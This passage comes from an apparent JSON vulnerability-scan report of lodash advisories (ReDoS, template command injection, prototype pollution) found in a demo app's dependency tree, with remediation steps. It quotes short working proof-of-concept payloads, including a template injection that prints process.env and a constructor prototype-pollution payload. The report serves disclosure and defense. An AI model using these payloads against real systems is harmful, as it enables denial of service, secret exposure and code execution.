            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-28500"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-LODASH-1018905",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions.\r\n\r\n### POC\r\n```\r\nvar lo = require('lodash');\r\n\r\nfunction build_blank (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\n\r\nvar s = build_blank(50000)\r\nvar time0 = Date.now();\r\nlo.trim(s)\r\nvar time_cost0 = Date.now() - time0;\r\nconsole.log(\"time_cost0: \" + time_cost0)\r\n\r\nvar time1 = Date.now();\r\nlo.toNumber(s)\r\nvar time_cost1 = Date.now() - time1;\r\nconsole.log(\"time_cost1: \" + time_cost1)\r\n\r\nvar time2 = Date.now();\r\nlo.trimEnd(s)\r\nvar time_cost2 = Date.now() - time2;\r\nconsole.log(\"time_cost2: \" + time_cost2)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `lodash` to version 4.17.21 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a)\n- [GitHub Fix PR](https://github.com/lodash/lodash/pull/5065)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-10-16T16:48:40.985673Z\",\n  \"credit\": [\n    \"Liyuan Chen\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions.\\r\\n\\r\\n### POC\\r\\n```\\r\\nvar lo = require('lodash');\\r\\n\\r\\nfunction build_blank (n) {\\r\\nvar ret = \\\"1\\\"\\r\\nfor (var i = 0; i < n; i++) {\\r\\nret += \\\" \\\"\\r\\n}\\r\\n\\r\\nreturn ret + \\\"1\\\";\\r\\n}\\r\\n\\r\\nvar s = build_blank(50000)\\r\\nvar time0 = Date.now();\\r\\nlo.trim(s)\\r\\nvar time_cost0 = Date.now() - time0;\\r\\nconsole.log(\\\"time_cost0: \\\" + time_cost0)\\r\\n\\r\\nvar time1 = Date.now();\\r\\nlo.toNumber(s)\\r\\nvar time_cost1 = Date.now() - time1;\\r\\nconsole.log(\\\"time_cost1: \\\" + time_cost1)\\r\\n\\r\\nvar time2 = Date.now();\\r\\nlo.trimEnd(s)\\r\\nvar time_cost2 = Date.now() - time2;\\r\\nconsole.log(\\\"time_cost2: \\\" + time_cost2)\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.21 or higher.\\n## References\\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a)\\n- [GitHub Fix PR](https://github.com/lodash/lodash/pull/5065)\\n\",\n  \"disclosureTime\": \"2020-10-16T16:47:34Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.21\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-LODASH-1018905\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-28500\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:26:11.286253Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-02-15T11:50:49Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a\"\n    },\n    {\n      \"title\": \"GitHub Fix PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/5065\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.21\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.21\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "78"
            ],
            "cveid": [
              "2021-23337"
            ],
            "ghsaid": [
              "35jh-r3h4-6jhm"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Command Injection",
          "id": "SNYK-JS-LODASH-1040724",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Command Injection via `template`.\r\n\r\n### PoC\r\n```js\r\nvar _ = require('lodash');\r\n\r\n_.template('', { variable: '){console.log(process.env)}; with(obj' })()\r\n```\n## Remediation\nUpgrade `lodash` to version 4.17.21 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c)\n- [Vulnerable Code](https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-11-17T14:07:17.048472Z\",\n  \"credit\": [\n    \"Marc Hassan\"\n  ],\n  \"cvssScore\": 7.2,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Command Injection via `template`.\\r\\n\\r\\n### PoC\\r\\n```js\\r\\nvar _ = require('lodash');\\r\\n\\r\\n_.template('', { variable: '){console.log(process.env)}; with(obj' })()\\r\\n```\\n## Remediation\\nUpgrade `lodash` to version 4.17.21 or higher.\\n## References\\n- [GitHub Commit](https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c)\\n- [Vulnerable Code](https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851)\\n\",\n  \"disclosureTime\": \"2020-11-17T13:02:10Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.21\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-LODASH-1040724\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23337\"\n    ],\n    \"CWE\": [\n      \"CWE-78\"\n    ],\n    \"GHSA\": [\n      \"GHSA-35jh-r3h4-6jhm\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:28:18.096614Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-02-15T11:50:50Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\"\n    },\n    {\n      \"title\": \"Vulnerable Code\",\n      \"url\": \"https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js%23L14851\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.21\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Command Injection\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.21\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2019-10744"
            ],
            "ghsaid": [
              "jf85-cpcp-j695"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-LODASH-450202",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nconst mergeFn = require('lodash').defaultsDeep;\r\nconst payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}'\r\n\r\nfunction check() {\r\n    mergeFn({}, JSON.parse(payload));\r\n    if (({})[`a0`] === true) {\r\n        console.log(`Vulnerable to Prototype Pollution via ${payload}`);\r\n    }\r\n  }\r\n\r\ncheck();\r\n```\r\n\r\nFor more information, check out our [blog post](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.12 or higher.\n## References\n- [GitHub Issue](https://github.com/lodash/lodash/issues/4348)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4336)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4355)\n- [GitHub PR](https://github.com/sailshq/lodash/pull/1)\n- [Node Security Advisory](https://www.npmjs.com/advisories/1065)\n- [Snyk Blog](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-06-19T12:04:21.040000Z\",\n  \"credit\": [\n    \"Snyk Security Team\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The function `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\\r\\n\\r\\n## PoC by Snyk\\r\\n```\\r\\nconst mergeFn = require('lodash').defaultsDeep;\\r\\nconst payload = '{\\\"constructor\\\": {\\\"prototype\\\": {\\\"a0\\\": true}}}'\\r\\n\\r\\nfunction check() {\\r\\n    mergeFn({}, JSON.parse(payload));\\r\\n    if (({})[`a0`] === true) {\\r\\n        console.log(`Vulnerable to Prototype Pollution via ${payload}`);\\r\\n    }\\r\\n  }\\r\\n\\r\\ncheck();\\r\\n```\\r\\n\\r\\nFor more information, check out our [blog post](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.12 or higher.\\n## References\\n- [GitHub Issue](https://github.com/lodash/lodash/issues/4348)\\n- [GitHub PR](https://github.com/lodash/lodash/pull/4336)\\n- [GitHub PR](https://github.com/lodash/lodash/pull/4355)\\n- [GitHub PR](https://github.com/sailshq/lodash/pull/1)\\n- [Node 